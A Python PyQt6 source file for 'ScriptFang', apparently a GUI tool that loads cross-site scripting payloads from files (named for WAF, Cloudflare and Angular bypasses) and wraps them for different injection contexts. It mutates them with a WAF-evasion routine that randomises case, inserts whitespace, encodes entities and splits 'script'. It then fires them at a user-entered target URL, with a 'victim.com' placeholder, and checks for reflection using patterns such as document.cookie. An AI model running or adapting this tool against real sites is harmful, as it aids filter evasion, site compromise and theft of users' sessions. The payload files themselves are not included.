from PyQt6.QtWidgets import (
    QApplication, QLabel, QWidget, QPushButton, QTextEdit, QLineEdit, QComboBox, QCheckBox
)
from PyQt6.QtGui import QMovie, QFont, QTextCursor
from PyQt6.QtCore import Qt, QSize
import sys
import os
import random
import re
import requests

class ScriptFangGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ScriptFang")
        self.setFixedSize(1280, 780)  # EXACT size as before

        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.payload_dir = os.path.join(base_dir, "tools", "payloads")

        gif_path = os.path.join(base_dir, "assets", "dragons.gif")
        print("Resolved GIF path:", gif_path)

        # Background GIF label
        self.bg_label = QLabel(self)
        self.bg_label.setGeometry(0, 0, self.width(), self.height())
        self.bg_label.setStyleSheet("background: black;")
        self.bg_label.lower()

        self.movie = QMovie(gif_path)
        if not self.movie.isValid():
            print(f"❌ Failed to load GIF from {gif_path}")
            self.bg_label.setText("Failed to load GIF")
            self.bg_label.setStyleSheet("color: red; background: black; font-size: 24px;")
        else:
            self.movie.setCacheMode(QMovie.CacheMode.CacheAll)
            self.movie.setSpeed(100)
            self.movie.setScaledSize(QSize(self.width(), self.height()))
            self.bg_label.setMovie(self.movie)
            self.movie.start()

        # Title
        self.title = QLabel("SCRIPTFANG", self)
        self.title.setStyleSheet("color: #00ff00; background: transparent;")
        self.title.setFont(QFont("Courier", 55, QFont.Weight.Bold))
        self.title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.title.setGeometry(0, 30, 1280, 60)

        # URL input - EXACT same position and size as before
        self.url_input = QLineEdit(self)
        self.url_input.setPlaceholderText("Enter target URL (e.g. https://victim.com/search?q=)")
        self.url_input.setGeometry(390, 110, 500, 40)
        self.url_input.setStyleSheet(
            "background-color: rgba(0,0,0,0.6); color: #00ff00; font-size: 14px; border: 2px solid #00ff00; border-radius: 10px;"
        )
        self.url_input.setFont(QFont("Courier", 12))

        # Context dropdown - place immediately to the RIGHT of URL input
        # So URL input ends at x=390+500=890, dropdown at 900 (10px gap)
        self.context_selector = QComboBox(self)
        self.context_selector.setGeometry(900, 110, 150, 40)  # exactly aligned vertically with URL input
        self.context_selector.setFont(QFont("Courier", 12))
        self.context_selector.addItems(["HTML", "JavaScript", "Attribute", "URL"])
        self.context_selector.setStyleSheet(
            "background-color: rgba(0,0,0,0.6); color: #00ff00; border: 2px solid #00ff00; border-radius: 10px;"
        )

        # WAF evasion checkbox - right of context selector with 10px gap
        self.waf_checkbox = QCheckBox("Enable WAF Evasion", self)
        self.waf_checkbox.setGeometry(1060, 110, 200, 40)
        self.waf_checkbox.setFont(QFont("Courier", 12))
        self.waf_checkbox.setStyleSheet("color: #00ff00; background: transparent;")

        # Payload output box - EXACT position and size
        self.output = QTextEdit(self)
        self.output.setGeometry(390, 290, 660, 120)
        self.output.setReadOnly(True)
        self.output.setStyleSheet(
            "background-color: rgba(0, 0, 0, 0.6); color: #00ff00; font-size: 14px; border: 2px solid #00ff00; border-radius: 10px;"
        )
        self.output.setFont(QFont("Courier", 12))
        self.output.setText("// XSS Payload will appear here\n")

        # Feedback label - EXACT position and style
        self.feedback = QLabel("", self)
        self.feedback.setGeometry(390, 420, 660, 30)
        self.feedback.setStyleSheet("color: #00ff00; background: transparent; font-size: 14px;")
        self.feedback.setAlignment(Qt.AlignmentFlag.AlignCenter)

        # Footer - EXACT position
        self.footer = QLabel("GitHub: github.com/Talyx66  |  Made by Talyx", self)
        self.footer.setStyleSheet("color: #00ff00; background: transparent;")
        self.footer.setFont(QFont("Courier", 10))
        self.footer.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.footer.setGeometry(0, 740, 1280, 30)

        # Buttons - keep EXACT positions and sizes like before
        self.payload_buttons_info = [
            ("XSS Payload", "xss.txt", 390),
            ("WAF Bypass", "waf_bypass.txt", 590),
            ("Angular Payload", "angular.txt", 790),
            ("href Payload", "href.txt", 990),
            ("Script Breakout", "script_breakout.txt", 390),
            ("ScriptSneaky", "scriptsneaky.txt", 590),
            ("Body Payload", "body.txt", 790),
            ("Div Payload", "div.txt", 990),
            ("Cloudflare Bypass", "cloudflare.txt", 1190)
        ]

        self.buttons = {}
        y_pos_upper = 170
        for label, filename, x_pos in self.payload_buttons_info[:4]:
            btn = QPushButton(label, self)
            btn.setGeometry(x_pos, y_pos_upper, 180, 40)
            btn.setStyleSheet(
                "background-color: rgba(0,128,0,0.7); color: white; font-size: 14px; border-radius: 8px;"
            )
            btn.clicked.connect(lambda _, f=filename: self.generate_payload_from_file(f))
            self.buttons[label] = btn

        y_pos_lower = 220
        for label, filename, x_pos in self.payload_buttons_info[4:]:
            btn = QPushButton(label, self)
            btn.setGeometry(x_pos, y_pos_lower, 180, 40)
            btn.setStyleSheet(
                "background-color: rgba(0,128,0,0.7); color: white; font-size: 14px; border-radius: 8px;"
            )
            btn.clicked.connect(lambda _, f=filename: self.generate_payload_from_file(f))
            self.buttons[label] = btn

        # Generate Multiple Payloads button - EXACT position and size
        self.multi_button = QPushButton("Generate Multiple Payloads", self)
        self.multi_button.setGeometry(390, 540, 250, 50)
        self.multi_button.setStyleSheet(
            "background-color: rgba(0,100,0,0.7); color: white; font-size: 16px; border-radius: 8px;"
        )
        self.multi_button.clicked.connect(self.generate_multiple_payloads)

        # Test Payload button - EXACT position and size
        self.test_button = QPushButton("Test Payload", self)
        self.test_button.setGeometry(670, 540, 180, 50)
        self.test_button.setStyleSheet(
            "background-color: rgba(128,0,0,0.7); color: white; font-size: 16px; border-radius: 8px;"
        )
        self.test_button.clicked.connect(self.test_payload)

        # Hue buttons on the far right side - keep small and stacked
        self.hue_buttons = {}
        hues = {"Green": "#00ff00", "Red": "#ff3333", "Blue": "#3399ff"}
        start_y = 170
        x_pos = 1200
        for idx, (name, color) in enumerate(hues.items()):
            btn = QPushButton(name, self)
            btn.setGeometry(x_pos, start_y + idx * 50, 70, 35)
            btn.setStyleSheet(
                f"background-color: {color}; color: black; font-weight: bold; border-radius: 6px;"
            )
            btn.clicked.connect(lambda _, c=color: self.change_hue(c))
            self.hue_buttons[name] = btn

        self.current_payloads = []

    def resizeEvent(self, event):
        self.bg_label.setGeometry(0, 0, self.width(), self.height())
        if self.movie and self.movie.isValid():
            self.movie.setScaledSize(QSize(self.width(), self.height()))
        super().resizeEvent(event)

    def generate_payload_from_file(self, filename):
        try:
            path = os.path.join(self.payload_dir, filename)
            with open(path, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]
            if not payloads:
                self.output.setPlainText(f"// No payloads found in {filename}.")
                self.current_payloads = []
                self.feedback.setText("")
                return

            context = self.context_selector.currentText()
            waf_evasion = self.waf_checkbox.isChecked()

            payload = random.choice(payloads)
            payload = self.apply_context_aware(payload, context)
            if waf_evasion:
                payload = self.apply_waf_evasion(payload)

            self.current_payloads = [payload]
            self.output.setPlainText(payload)
            cursor = self.output.textCursor()
            cursor.movePosition(QTextCursor.MoveOperation.Start)
            self.output.setTextCursor(cursor)
            self.feedback.setText("")
        except Exception as e:
            self.output.setPlainText(f"⚠️ Error loading {filename}: {e}")
            self.current_payloads = []
            self.feedback.setText("")

    def generate_multiple_payloads(self):
        try:
            path = os.path.join(self.payload_dir, "xss.txt")
            with open(path, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]
            if not payloads:
                self.output.setPlainText("// No payloads found in xss.txt.")
                self.current_payloads = []
                self.feedback.setText("")
                return

            context = self.context_selector.currentText()
            waf_evasion = self.waf_checkbox.isChecked()

            selected = random.sample(payloads, min(5, len(payloads)))
            mutated = []
            for p in selected:
                p_c = self.apply_context_aware(p, context)
                if waf_evasion:
                    p_c = self.apply_waf_evasion(p_c)
                mutated.append(p_c)

            self.current_payloads = mutated
            self.output.setPlainText("\n\n".join(mutated))
            cursor = self.output.textCursor()
            cursor.movePosition(QTextCursor.MoveOperation.Start)
            self.output.setTextCursor(cursor)
            self.feedback.setText("")
        except Exception as e:
            self.output.setPlainText(f"⚠️ Error loading xss.txt: {e}")
            self.current_payloads = []
            self.feedback.setText("")

    def apply_context_aware(self, payload: str, context: str) -> str:
        if context == "HTML":
            return payload.replace("<", "&lt;").replace(">", "&gt;")
        elif context == "JavaScript":
            return f"<script>{payload}</script>"
        elif context == "Attribute":
            return f'" onmouseover="{payload}" "'
        elif context == "URL":
            import requests.utils
            return requests.utils.quote(payload)
        return payload

    def apply_waf_evasion(self, payload: str) -> str:
        def random_case(s):
            return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)

        def insert_whitespace(s):
            spaced = ""
            for ch in s:
                spaced += ch
                if random.random() < 0.15:
                    spaced += random.choice([' ', '\t', '\n'])
            return spaced

        def encode_entities(s):
            s = s.replace("<", random.choice(["&#60;", "&lt;"]))
            s = s.replace(">", random.choice(["&#62;", "&gt;"]))
            return s

        def split_script_tag(s):
            return s.replace("script", "scr\" + \"ipt")

        p = payload
        p = random_case(p)
        p = insert_whitespace(p)
        p = encode_entities(p)
        p = split_script_tag(p)

        return p

    def test_payload(self):
        target_url = self.url_input.text().strip()
        if not target_url:
            self.feedback.setText("⚠️ Enter a valid target URL first.")
            return
        if not self.current_payloads:
            self.feedback.setText("⚠️ Generate payload(s) first.")
            return

        self.feedback.setText("⏳ Testing payload(s) on target...")
        self.repaint()

        results = []

        for payload in self.current_payloads:
            test_url = target_url + payload
            try:
                resp = requests.get(test_url, timeout=10)
                content = resp.text

                patterns = [
                    re.escape(payload),
                    r"(?i)<script>alert\(",
                    r"(?i)onerror=",
                    r"(?i)onload=",
                    r"(?i)javascript:",
                    r"(?i)document\.cookie",
                ]

                matched = any(re.search(pattern, content) for pattern in patterns)

                if matched:
                    results.append(f"✅ Payload reflected: {payload[:40]}...")
                else:
                    if resp.status_code in (403, 406):
                        results.append(f"❌ Blocked (HTTP {resp.status_code}): {payload[:40]}...")
                    elif resp.status_code >= 500:
                        results.append(f"⚠️ Server error (HTTP {resp.status_code}): {payload[:40]}...")
                    else:
                        results.append(f"⚠️ No reflection (HTTP {resp.status_code}): {payload[:40]}...")

            except requests.exceptions.Timeout:
                results.append(f"❌ Timeout: {payload[:40]}...")
            except requests.exceptions.RequestException as e:
                results.append(f"❌ Request error: {e}")

        self.feedback.setStyleSheet("color: #00ff00;" if any(r.startswith("✅") for r in results) else "color: #ffbb55;")
        self.feedback.setText("\n".join(results))

    def change_hue(self, color_hex):
        stylesheet_template = f"""
            QLabel, QLineEdit, QTextEdit {{
                color: {color_hex};
                border-color: {color_hex};
            }}
            QPushButton {{
                background-color: {color_hex}aa;
                color: black;
                font-weight: bold;
                border-radius: 6px;
            }}
            QPushButton:hover {{
                background-color: {color_hex}dd;
            }}
            QCheckBox {{
                color: {color_hex};
            }}
            QComboBox {{
                color: {color_hex};
                border-color: {color_hex};
            }}
        """
        self.setStyleSheet(stylesheet_template)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    gui = ScriptFangGUI()
    gui.show()
    sys.exit(app.exec())
